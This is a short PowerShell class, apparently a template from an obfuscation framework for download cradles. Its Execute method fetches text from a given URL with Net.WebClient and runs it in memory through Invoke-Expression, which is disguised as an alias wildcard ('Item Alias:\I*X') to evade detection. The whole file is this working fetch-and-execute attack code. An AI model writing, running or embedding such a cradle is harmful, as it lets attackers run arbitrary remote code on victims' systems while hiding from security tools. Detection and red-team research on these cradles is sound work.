Class ObfDownloadFileContent9 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\3
        Write-Host .(Item Alias:\I*X)((New-Object Net.WebClient).DownloadString($url))
    }

}